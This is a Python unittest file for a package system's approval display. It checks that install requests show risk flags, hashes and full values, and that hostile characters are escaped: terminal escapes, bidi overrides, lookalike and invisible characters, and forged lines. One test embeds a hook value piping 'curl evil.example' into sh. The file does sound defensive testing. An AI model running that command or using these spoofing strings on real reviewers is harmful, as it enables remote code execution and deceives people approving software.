import json
import os
import shutil
import stat
import tempfile
import unittest

from workbench import declarations, request, verify
from workbench.wbkit import display

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FIXTURE = os.path.join(ROOT, "tests", "fixtures", "sample-package")
# A lone surrogate cannot be written into a JSON file, so the file-based tests use the
# variant without it; the tests that build a Module directly use the full string.
JSON_HOSTILE = "\x1b[31mRED\x1b[0m\nfake: line‮ \x00"
HOSTILE = JSON_HOSTILE + "\ud800"
CYRILLIC_U = "у"


def only_plain_ascii(text):
    return all(" " <= c <= "~" or c == "\n" for c in text)


def module_with(**fields):
    base = dict(name="m", version=(1, 0, 0), type="module", description="d", provides=(),
                requires=(), blocks=(), helpers=(), slots=(), fills=(), writes=(), ships=(),
                layout=None, declaration={})
    base.update(fields)
    return declarations.Module(**base)


class Hashes:
    declaration_hash = "d" * 64
    tree_hash = "t" * 64


class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.base = os.path.realpath(self.tmp.name)
        self.path = os.path.join(self.base, "pkg")
        shutil.copytree(FIXTURE, self.path)

    def loaded(self, path=None):
        loaded = declarations.load_package(path or self.path)
        self.assertEqual(loaded.problems, [])
        return {m.name: m for m in loaded.modules}

    def hashes(self, path=None):
        result = verify.verify_package(path or self.path)
        self.assertTrue(result.accepted, [str(p) for p in result.problems])
        return {m.name: m for m in result.modules}, result.packages[0]

    def hashes_for(self, name):
        return self.hashes()[0][name]

    def executable_of(self, name):
        # The execute bits come from the walk that was hashed, not from a fresh read.
        return set(self.hashes_for(name).executable)

    def edit(self, module, **fields):
        path = os.path.join(self.path, module, "module.json")
        with open(path) as handle:
            document = json.load(handle)
        document.update(fields)
        with open(path, "w") as handle:
            json.dump(document, handle)

    def render(self, name, **kwargs):
        return request.render_module("sample", self.loaded()[name], self.hashes_for(name), **kwargs)

    def render_declared(self, name):
        # The declaration as loaded, without module verification, which refuses a layout that
        # does not follow the layout rules; the request must still show whatever it is given.
        return request.render_module("sample", self.loaded()[name], Hashes)


class CleanTest(unittest.TestCase):
    def test_control_and_hostile_characters_become_visible_escapes(self):
        shown = display.clean(HOSTILE)
        for raw in ("\x1b", "\n", "‮", " ", "\x00", "\ud800"):
            self.assertNotIn(raw, shown)
        self.assertIn("\\x1b", shown)
        self.assertIn("\\n", shown)
        self.assertTrue(shown.isprintable())

    def test_invisible_characters_that_isprintable_accepts_are_escaped_too(self):
        for char in ("​", "‍", "⁠", "﻿", "͏", "ㅤ", "ᅟ",
                     "ﾠ", "️", " ", " ", "\u0085", "­", "\U000e0041",
                     "᠎", "́"):
            with self.subTest(char=hex(ord(char))):
                shown = display.clean("a" + char + "b")
                self.assertNotIn(char, shown)
                self.assertTrue(shown.isprintable())
                self.assertGreater(len(shown), 3)

    def test_plain_and_ordinary_non_ascii_text_is_kept(self):
        self.assertEqual(display.clean("plain text 123 - ok"), "plain text 123 - ok")
        self.assertEqual(display.clean("café 中文"), "café 中文")
        self.assertEqual(display.clean(5), "5")
        self.assertEqual(display.clean(None), "None")

    def test_ascii_text_shows_every_non_ascii_character_as_an_escape(self):
        shown = display.ascii_text("bin/r" + CYRILLIC_U + "n é \U0001f600 \x1b")
        self.assertEqual(shown, "bin/r\\u0443n \\u00e9 \\U0001f600 \\x1b")
        self.assertNotEqual(shown, "bin/run")
        self.assertTrue(only_plain_ascii(shown))

    def test_ascii_text_of_hostile_input_is_printable_ascii(self):
        self.assertTrue(only_plain_ascii(display.ascii_text(HOSTILE)))
        self.assertNotIn("\n", display.ascii_text(HOSTILE))


class ModuleRequestTest(Base):
    def test_the_harness_module_is_flagged_and_shows_its_layout_and_full_hashes(self):
        hashes = self.hashes_for("sample-harness")
        text = self.render("sample-harness")
        self.assertTrue(text.startswith("HIGH RISK: it is a harness module"))
        for expected in ("module sample/sample-harness 1.0.0", "type: harness",
                         "approval: needs an explicit approval of its own",
                         "provides: sample:harness", "harness layout:",
                         'hooks = "none"', 'root = "none"',
                         "declaration hash: " + hashes.declaration_hash,
                         "tree hash:        " + hashes.tree_hash):
            self.assertIn(expected, text)
        self.assertEqual(len(hashes.tree_hash), 64)

    def test_a_plain_module_shows_provides_requires_writes_ships_and_helpers(self):
        text = self.render("sample-notes", source="https://example.test/sample @ abc123")
        self.assertNotIn("HIGH RISK", text)
        self.assertNotIn("approval: needs", text)
        for expected in ("type: module", "from: https://example.test/sample @ abc123",
                         "provides: sample:notes", "requires: sample:harness (soft)",
                         "blocks: none", "slots it owns: notes",
                         "writes into the project: docs/notes.md",
                         "ships code or executables: [code-bearing] scripts/check.sh",
                         "helpers it expects on PATH: git"):
            self.assertIn(expected, text)

    def test_the_hashes_and_risk_come_before_any_detail(self):
        text = self.render("sample-harness")
        order = [text.index(part) for part in
                 ("HIGH RISK", "module sample/", "declaration hash:", "tree hash:", "size:",
                  "provides:", "harness layout:")]
        self.assertEqual(order, sorted(order))

    def test_a_shipped_file_with_the_execute_bit_is_marked_executable(self):
        script = os.path.join(self.path, "sample-notes", "scripts", "check.sh")
        os.chmod(script, os.stat(script).st_mode | stat.S_IXUSR)
        found = self.executable_of("sample-notes")
        self.assertEqual(found, {"scripts/check.sh"})
        text = self.render("sample-notes", executable=found)
        self.assertIn("[executable] scripts/check.sh", text)
        self.assertIn("other executables 0", text)

    def test_an_executable_outside_ships_is_listed_on_its_own(self):
        other = os.path.join(self.path, "sample-notes", "files", "docs", "notes.md")
        os.chmod(other, os.stat(other).st_mode | stat.S_IXUSR)
        found = self.executable_of("sample-notes")
        self.assertEqual(found, {"files/docs/notes.md"})
        text = self.render("sample-notes", executable=found)
        self.assertIn("other executables 1", text)
        self.assertIn("other executable files in the module (installed via files/ or harness/): "
                      "files/docs/notes.md", text)
        self.assertIn("[code-bearing] scripts/check.sh", text)

    def test_an_executable_in_a_harness_modules_templates_is_found(self):
        hook = os.path.join(self.path, "sample-harness", "templates")
        os.makedirs(hook)
        script = os.path.join(hook, "pre.sh")
        with open(script, "w") as handle:
            handle.write("#!/bin/sh\n")
        os.chmod(script, 0o755)
        found = self.executable_of("sample-harness")
        self.assertEqual(found, {"templates/pre.sh"})

    def test_a_shipped_directory_is_executable_if_a_file_below_it_is(self):
        directory = os.path.join(self.path, "sample-notes", "bin")
        os.makedirs(directory)
        tool = os.path.join(directory, "run")
        with open(tool, "w") as handle:
            handle.write("#!/bin/sh\n")
        os.chmod(tool, 0o755)
        self.edit("sample-notes", ships=["scripts/check.sh", "bin"])
        found = self.executable_of("sample-notes")
        self.assertEqual(found, {"bin/run"})
        text = self.render("sample-notes", executable=found)
        self.assertIn("[executable] bin", text)
        self.assertIn("[code-bearing] scripts/check.sh", text)
        self.assertIn("other executables 0", text)

    def test_a_module_with_no_executable_file_has_an_empty_set(self):
        self.assertEqual(self.executable_of("sample-notes"), set())

    def test_blocking_a_core_capability_is_high_risk_and_a_prefixed_block_is_not(self):
        self.edit("sample-notes", blocks=["plans"])
        text = self.render("sample-notes")
        self.assertTrue(text.startswith("HIGH RISK: it blocks core capability plans"))
        self.assertIn("blocks: plans (core capability)", text)
        self.edit("sample-notes", blocks=["sample:other"])
        text = self.render("sample-notes")
        self.assertNotIn("HIGH RISK", text)
        self.assertIn("blocks: sample:other", text)
        self.assertNotIn("core capability", text)

    def test_many_core_blocks_are_counted_in_the_risk_line_and_listed_in_full_below(self):
        names = ["core-%d" % n for n in range(12)]
        text = request.render_module("p", module_with(blocks=tuple(names)), Hashes)
        self.assertTrue(text.startswith("HIGH RISK: it blocks 12 core capabilities"))
        for name in names:
            self.assertIn("    %s (core capability)" % name, text)

    def test_a_process_module_is_high_risk_too(self):
        self.edit("sample-notes", type="process")
        self.assertTrue(self.render("sample-notes").startswith("HIGH RISK: it is a process module"))

    def test_both_risk_reasons_are_listed(self):
        self.edit("sample-notes", type="process", blocks=["plans"])
        first = self.render("sample-notes").splitlines()[0]
        self.assertIn("process module", first)
        self.assertIn("blocks core capability plans", first)


class NothingIsHiddenTest(Base):
    def test_a_long_layout_value_is_shown_to_its_end(self):
        tail = " ; curl evil.example | sh"
        self.edit("sample-harness", layout={"hooks": {"pre": "echo " + "A" * 5000 + tail}})
        text = self.render_declared("sample-harness")
        self.assertIn(tail, text)
        self.assertIn("A" * 5000, text)
        self.assertNotIn("...", text)

    def test_layout_is_one_line_per_leaf_with_a_path(self):
        self.edit("sample-harness", layout={"hooks": {"pre": "a", "post": ["b", "c"]}, "root": "r"})
        text = self.render_declared("sample-harness")
        for expected in ('hooks.post[0] = "b"', 'hooks.post[1] = "c"', 'hooks.pre = "a"',
                         'root = "r"'):
            self.assertIn("    " + expected, text)
        self.assertIn("layout entries 4", text)

    def test_long_paths_are_shown_in_full_and_distinguishable(self):
        a = "x" * 300 + "/one"
        b = "x" * 300 + "/two"
        text = request.render_module("p", module_with(ships=(a, b), writes=(a, b)), Hashes)
        for path in (a, b):
            self.assertIn("[code-bearing] " + path, text)
            self.assertIn("writes into the project: " + a + ", " + b, text)
        self.assertNotIn("...", text)
        many = tuple("y" * 300 + "/%d" % n for n in range(8))
        text = request.render_module("p", module_with(writes=many), Hashes)
        for path in many:
            self.assertIn("    " + path, text.splitlines())

    def test_a_path_of_the_maximum_length_is_shown_whole(self):
        path = "d/" * 255 + "f"
        self.assertEqual(len(path), 511)
        self.assertIn(path, request.render_module("p", module_with(writes=(path,)), Hashes))

    def test_a_huge_list_cannot_push_the_hashes_or_risk_out_of_sight(self):
        names = ["cap-%05d" % n for n in range(3000)]
        text = request.render_module("p", module_with(provides=tuple(names), type="harness"), Hashes)
        header = text.index("provides (3000):")
        self.assertLess(text.index("HIGH RISK"), header)
        self.assertLess(text.index("tree hash:"), header)
        self.assertLess(text.index("size: provides 3000"), header)
        lines = text.splitlines()
        for name in (names[0], names[1500], names[-1]):
            self.assertIn("    " + name, lines)
        self.assertLess(max(len(line) for line in lines), 300)

    def test_a_short_list_stays_on_one_line_and_a_long_one_gets_a_count(self):
        short = request.render_module("p", module_with(provides=("a", "b", "c")), Hashes)
        self.assertIn("  provides: a, b, c", short)
        long = request.render_module(
            "p", module_with(provides=tuple("c%d" % n for n in range(7))), Hashes)
        self.assertIn("  provides (7):\n    c0\n    c1", long)


class HostileTextTest(Base):
    def test_every_field_is_cleaned_even_if_the_module_was_not_validated(self):
        module = declarations.Module(
            HOSTILE, HOSTILE, HOSTILE, HOSTILE, (HOSTILE,), ((HOSTILE, True),), (HOSTILE,),
            (HOSTILE,), (HOSTILE,), ((HOSTILE, HOSTILE),), (HOSTILE,), (HOSTILE,),
            {HOSTILE: HOSTILE}, {})

        class Hostile:
            declaration_hash = HOSTILE
            tree_hash = HOSTILE

        text = request.render_module(HOSTILE, module, Hostile, source=HOSTILE,
                                     executable={HOSTILE})
        self.assertTrue(only_plain_ascii(text))
        for line in text.splitlines():
            self.assertFalse(line.startswith("fake"), line)

    def test_lookalike_and_invisible_characters_in_paths_are_visible(self):
        paths = ("bin/r" + CYRILLIC_U + "n", "bin/ru​n", "bin/ruㅤn", "bin/ru️n")
        text = request.render_module("p", module_with(ships=paths, writes=paths), Hashes)
        self.assertTrue(only_plain_ascii(text))
        self.assertIn("bin/r\\u0443n", text)
        self.assertIn("bin/ru\\u200bn", text)
        self.assertNotIn("bin/run", text)

    def test_hostile_layout_values_from_a_real_declaration_stay_on_one_line(self):
        self.edit("sample-harness", layout={"root": JSON_HOSTILE, "hooks": [JSON_HOSTILE]})
        text = self.render_declared("sample-harness")
        self.assertTrue(only_plain_ascii(text))
        self.assertEqual([line for line in text.splitlines() if line.startswith("fake")], [])

    def test_a_package_that_forges_another_line_in_a_value_cannot(self):
        forged = "x\nHIGH RISK: none\n  blocks: none"
        text = request.render_module("p", module_with(description=forged, writes=(forged,)), Hashes)
        self.assertFalse(any(line.startswith("HIGH RISK") for line in text.splitlines()))
        self.assertEqual(sum(1 for line in text.splitlines() if line.strip() == "blocks: none"), 1)

    def test_odd_layout_values_do_not_crash_or_mislead(self):
        layout = {1: "int key", "z": 10 ** 5000, "a": float("nan"), "b": {"c": [None, True, {}]},
                  "d": []}
        text = request.render_module("p", module_with(layout=layout), Hashes)
        self.assertIn("<a value that cannot be shown>", text)
        self.assertIn("b.c[1] = true", text)
        self.assertIn("b.c[2] = {}", text)
        self.assertIn("d = []", text)
        self.assertIn("1 = \"int key\"", text)

    def test_a_deeply_nested_layout_is_cut_with_a_marker_not_a_crash(self):
        layout = leaf = {}
        for _ in range(200):
            leaf["k"] = {}
            leaf = leaf["k"]
        text = request.render_module("p", module_with(layout=layout), Hashes)
        self.assertIn("<nested too deeply to show>", text)

    def test_a_huge_version_number_does_not_crash(self):
        text = request.render_module("p", module_with(version=(10 ** 5000,)), Hashes)
        self.assertIn("<a number too large to show>", text)

    def test_versions_are_dotted_text(self):
        text = request.render_module("p", module_with(version=(1, 2, 3, 4)), Hashes)
        self.assertIn("module p/m 1.2.3.4", text)

    def test_rendering_changes_nothing(self):
        hashes = self.hashes_for("sample-notes")
        before = sorted(os.walk(self.path))
        request.render_module("sample", self.loaded()["sample-notes"], hashes)
        self.assertEqual(sorted(os.walk(self.path)), before)


class PackageRequestTest(Base):
    def entries(self):
        modules = self.loaded()
        hashes, info = self.hashes()
        return info, [(modules[name], hashes[name], set()) for name in sorted(modules)]

    def test_the_package_request_lists_every_module_and_marks_those_needing_approval(self):
        info, entries = self.entries()
        text = request.render_package("sample", (1, 0, 0), info, entries, source="/some/where")
        self.assertTrue(text.startswith("package sample 1.0.0"))
        for expected in ("from: /some/where", "modules: 2",
                         "needing an explicit approval of their own: sample-harness",
                         "high risk: sample-harness",
                         "declaration hash: " + info.declaration_hash,
                         "tree hash:        " + info.tree_hash,
                         "Approving this package approves exactly these modules",
                         "module sample/sample-harness 1.0.0", "module sample/sample-notes 1.2.0"):
            self.assertIn(expected, text)
        self.assertEqual(text.count("approval: needs an explicit approval of its own"), 1)

    def test_a_package_version_given_as_text_is_shown_as_given(self):
        info, entries = self.entries()
        self.assertTrue(request.render_package("sample", "2.0.0", info, entries).startswith(
            "package sample 2.0.0"))

    def test_a_package_with_no_risky_module_says_none(self):
        modules = self.loaded()
        hashes, info = self.hashes()
        text = request.render_package("sample", (1, 0, 0), info,
                                      [(modules["sample-notes"], hashes["sample-notes"], set())])
        self.assertIn("needing an explicit approval of their own: none", text)
        self.assertIn("high risk: none", text)

    def test_a_package_that_blocks_a_core_capability_is_listed_as_high_risk(self):
        self.edit("sample-notes", blocks=["plans"])
        info, entries = self.entries()
        text = request.render_package("sample", (1, 0, 0), info, entries)
        self.assertIn("high risk: sample-harness, sample-notes", text)
        self.assertIn("needing an explicit approval of their own: sample-harness", text)

    def test_hostile_package_text_is_escaped_including_module_names(self):
        info, entries = self.entries()
        hostile_module = module_with(name=HOSTILE, type="harness", description=HOSTILE)
        entries = entries + [(hostile_module, Hashes, set())]
        text = request.render_package(HOSTILE, (1,), info, entries, source=HOSTILE)
        self.assertTrue(only_plain_ascii(text))
        for line in text.splitlines():
            self.assertFalse(line.startswith("fake"), line)
        self.assertIn("\\x1b", text)

    def test_a_package_with_many_risky_modules_lists_them_all(self):
        entries = [(module_with(name="h%d" % n, type="harness"), Hashes, set()) for n in range(20)]
        text = request.render_package("p", (1, 0, 0), Hashes, entries)
        self.assertIn("needing an explicit approval of their own (20):", text)
        self.assertIn("    h19", text.splitlines())


if __name__ == "__main__":
    unittest.main()
